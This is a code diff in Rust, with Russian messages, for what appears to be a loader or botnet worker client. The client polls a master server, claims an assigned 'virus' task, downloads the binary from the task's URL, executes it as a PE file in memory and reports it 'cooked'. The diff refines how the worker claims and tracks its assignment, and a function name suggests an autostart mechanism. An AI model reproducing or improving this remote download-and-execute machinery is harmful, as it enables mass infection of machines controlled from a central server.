@@ -20,6 +20,12 @@ struct Virus {
     status: String,
 }
 
+#[derive(Clone, Deserialize)]
+struct Snapshot {
+    que: Vec<Virus>,
+    pro: HashMap<String, u64>,
+}
+
 #[derive(Serialize)]
 struct VirusResult {
     id: u64,
@@ -54,7 +60,7 @@ async fn poll_with_retries(client: &reqwest::Client) {
 }
 
 async fn poll(client: &reqwest::Client) -> Result<()> {
-    let que: Vec<Virus> = client
+    let snapshot: Snapshot = client
         .get(format!("{MASTER}/poll"))
         .send()
         .await?
@@ -62,12 +68,33 @@ async fn poll(client: &reqwest::Client) -> Result<()> {
         .json()
         .await?;
 
-    if let Some(virus) = que
+    let me = local_ip();
+
+    if let Some(id) = snapshot.pro.get(&me) {
+        let virus = snapshot
+            .que
+            .iter()
+            .find(|virus| virus.id == *id)
+            .cloned()
+            .context("мастер назначил мне вирус, а его нет в que")?;
+
+        if virus.status != "cooked" {
+            tokio::spawn(run_virus(client.clone(), virus));
+        }
+        return Ok(());
+    }
+
+    let Some(virus) = snapshot
+        .que
         .iter()
         .filter(|virus| virus.status == "created")
         .min_by_key(|virus| virus.id)
         .cloned()
-    {
+    else {
+        return Ok(());
+    };
+
+    if claim(&client, virus.id).await?.contains("accepted") {
         tokio::spawn(run_virus(client.clone(), virus));
     }
 
@@ -81,8 +108,6 @@ async fn run_virus(client: reqwest::Client, virus: Virus) {
 }
 
 async fn run_virus_inner(client: reqwest::Client, virus: &Virus) -> Result<()> {
-    send_accepted(&client, virus.id).await?;
-
     let virus_bytes = client
         .get(&virus.url)
         .send()
@@ -101,8 +126,6 @@ async fn run_virus_inner(client: reqwest::Client, virus: &Virus) -> Result<()> {
             .execute_entry_point()
             .context("Не удалось выполнить точку входа PE-файл")?;
     }
-
-    seek_self_in_pro(&client, virus.id).await?;
 
     send_status(&client, virus.id, "cooked", VICTORY.as_bytes().to_vec()).await?;
 
@@ -123,43 +146,20 @@ async fn send_status(client: &reqwest::Client, id: u64, status: &str, out: Vec<u
     Ok(())
 }
 
-async fn send_accepted(client: &reqwest::Client, id: u64) -> Result<()> {
-    send_status(client, id, "accepted", local_ip().into_bytes()).await
-}
-
-async fn seek_self_in_pro(client: &reqwest::Client, id: u64) -> Result<()> {
-    let me = local_ip();
-
-    let pro: HashMap<String, u64> = client
-        .get(format!("{MASTER}/pro"))
+async fn claim(client: &reqwest::Client, id: u64) -> Result<String> {
+    let text = client
+        .post(format!("{MASTER}/virus_status"))
+        .json(&VirusResult {
+            id,
+            status: "accepted".to_owned(),
+            out: local_ip().into_bytes(),
+        })
         .send()
         .await?
         .error_for_status()?
-        .json()
+        .text()
         .await?;
-
-    if let Some(id) = pro.get(&me) {
-        println!("мы в pro: {me} -> virus {id}");
-        return Ok(());
-    }
-
-    eprintln!("в pro нас нет — перепосылаю accepted");
-    send_accepted(client, id).await?;
-
-    let pro: HashMap<String, u64> = client
-        .get(format!("{MASTER}/pro"))
-        .send()
-        .await?
-        .error_for_status()?
-        .json()
-        .await?;
-
-    match pro.get(&me) {
-        Some(id) => println!("мы в pro: {me} -> virus {id}"),
-        None => anyhow::bail!("после повторного accepted нас всё ещё нет в pro"),
-    }
-
-    Ok(())
+    Ok(text)
 }
 
 async fn autostart_watchdog() {
